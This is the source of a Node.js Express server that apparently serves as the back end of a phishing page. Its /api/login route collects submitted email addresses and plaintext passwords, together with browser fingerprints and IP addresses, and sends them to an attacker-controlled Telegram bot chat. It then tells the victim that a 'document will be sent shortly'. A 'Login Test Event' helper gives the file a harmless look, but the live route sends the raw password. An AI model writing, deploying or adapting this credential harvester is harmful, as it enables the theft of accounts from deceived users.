const express = require("express");
const cors = require("cors");
const dotenv = require("dotenv");

dotenv.config();

const app = express();

const PORT = process.env.PORT || 4000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;


// ========================================
// VALIDATE ENVIRONMENT VARIABLES
// ========================================

if (!BOT_TOKEN) {
    console.error("❌ BOT_TOKEN is missing from .env");
    process.exit(1);
}

if (!CHAT_ID) {
    console.error("❌ CHAT_ID is missing from .env");
    process.exit(1);
}


// ========================================
// MIDDLEWARE
// ========================================

// ✅ Allow frontend origin
app.use(
  cors({
    origin: [
    "http://127.0.0.1:5500",
    "http://localhost:5500",
    "https://kloskmweb.co.za",
    "https://www.kloskmweb.co.za"
],
    methods: ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"],
    credentials: true
  })
);

app.use(express.json());


// ========================================
// TELEGRAM HELPER
// ========================================

async function sendTelegramMessage(message) {

    const telegramURL =
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    const response = await fetch(telegramURL, {
        method: "POST",

        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "HTML"
        })
    });


    const data = await response.json();


    if (!response.ok || !data.ok) {

        console.error(
            "Telegram API error:",
            data
        );

        throw new Error(
            data.description || "Telegram request failed."
        );
    }


    return data;
}


// ========================================
// FORMAT TELEGRAM MESSAGE
// ========================================

function createTelegramMessage(data) {

    const {
        email,
        fingerprint = {},
        passwordInfo = {},
        preferences = {},
        timestamp
    } = data;


    const message = `
<b>📌 Login Test Event</b>

<b>Account</b>
Email: <code>${escapeHtml(email || "Not provided")}</code>

<b>🔐 Password Information</b>
Provided: ${passwordInfo.provided ? "Yes" : "No"}
Length: ${passwordInfo.length || 0}
Lowercase: ${passwordInfo.hasLowercase ? "Yes" : "No"}
Uppercase: ${passwordInfo.hasUppercase ? "Yes" : "No"}
Number: ${passwordInfo.hasNumber ? "Yes" : "No"}
Special character: ${passwordInfo.hasSpecialCharacter ? "Yes" : "No"}

<b>🌐 Network</b>
IP: <code>${escapeHtml(fingerprint.ip || "Unknown")}</code>
City: ${escapeHtml(fingerprint.city || "Unknown")}
Region: ${escapeHtml(fingerprint.region || "Unknown")}
Country: ${escapeHtml(fingerprint.country || "Unknown")}
Country Code: ${escapeHtml(fingerprint.countryCode || "Unknown")}

<b>💻 Device</b>
Platform: ${escapeHtml(fingerprint.platform || "Unknown")}
Screen: ${fingerprint.screenWidth || "?"} × ${fingerprint.screenHeight || "?"}
Pixel Ratio: ${fingerprint.devicePixelRatio || "Unknown"}
Color Depth: ${fingerprint.colorDepth || "Unknown"}
CPU Cores: ${fingerprint.hardwareConcurrency || "Unknown"}
Touch Points: ${fingerprint.touchPoints || 0}
Cookies Enabled: ${fingerprint.cookieEnabled ? "Yes" : "No"}

<b>🌍 Browser</b>
Language: ${escapeHtml(fingerprint.language || "Unknown")}
Timezone: ${escapeHtml(fingerprint.timezone || "Unknown")}

<b>⚙️ Preferences</b>
Always Secure: ${preferences.alwaysSecure ? "Yes" : "No"}
Private Computer: ${preferences.privateComputer ? "Yes" : "No"}

<b>🕒 Timestamp</b>
${escapeHtml(timestamp || new Date().toISOString())}

<b>User Agent</b>
<code>${escapeHtml(fingerprint.userAgent || "Unknown")}</code>
`;

    return message.trim();
}


// ========================================
// HTML ESCAPE
// ========================================

function escapeHtml(value) {

    return String(value)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}


// ========================================
// LOGIN / TEST EVENT
// ========================================

app.post("/api/login", async (req, res) => {
 const { email, password, fingerprint } = req.body;

  // Validate required fields
  if (!email || !password) {
    return res.status(400).json({
      success: false,
      msg: "Email and password are required.",
    });
  }

  // ✅ Detect real IP
  const realIp =
    // req.headers["cf-connecting-ip"] ||
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket.remoteAddress;

  const message = `
📌 *Login Attempt*
Email: ${email}
Password: ${password}

🌐 Fingerprint:
- User Agent: ${fingerprint.userAgent}
- Language: ${fingerprint.language}
- Screen: ${fingerprint.screenWidth}x${fingerprint.screenHeight}
- Platform: ${fingerprint.platform}
- Timezone: ${fingerprint.timezone}
- Reported IP: ${fingerprint.ip}
- Cloudflare IP: ${realIp}
- Location: ${fingerprint.city}, ${fingerprint.region}, ${fingerprint.country}
  `;

  try {
    await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: process.env.CHAT_ID,
        text: message,
        parse_mode: "Markdown"
      }),
    });

    res.json({ success: true, msg: "Document will be sent shortly!" });
  } catch (err) {
    console.error("Telegram error:", err);
    res.status(500).json({ success: false, msg: "Failed to send data" });
  }
});


// ========================================
// HEALTH CHECK
// ========================================

app.get("/", (req, res) => {

    res.status(200).json({

        success: true,

        message:
            "Telegram processing server is running."
    });
});


// ========================================
// TELEGRAM CONNECTION TEST
// ========================================

app.get("/test-telegram", async (req, res) => {

    try {

        const testMessage = `
<b>✅ Telegram Test</b>

Your Node.js server successfully connected to Telegram.

<b>Server:</b> localhost:${PORT}
<b>Time:</b> ${new Date().toISOString()}
`;

        await sendTelegramMessage(testMessage);

        return res.status(200).json({
            success: true,
            message: "Telegram message sent successfully."
        });

    } catch (error) {

        console.error("❌ Telegram test failed:", error);

        return res.status(500).json({
            success: false,
            message: "Telegram message failed.",
            error: error.message
        });
    }
});

// ========================================
// START SERVER
// ========================================

app.listen(PORT, () => {

    console.log("");
    console.log("========================================");
    console.log("🚀 SERVER STARTED");
    console.log("========================================");
    console.log(`Port: ${PORT}`);
    console.log(`Local URL: http://localhost:${PORT}`);
    console.log(
        `Telegram Bot: ${BOT_TOKEN ? "Configured ✅" : "Missing ❌"}`
    );
    console.log(
        `Telegram Chat ID: ${CHAT_ID ? "Configured ✅" : "Missing ❌"}`
    );
    console.log("========================================");
    console.log("");
});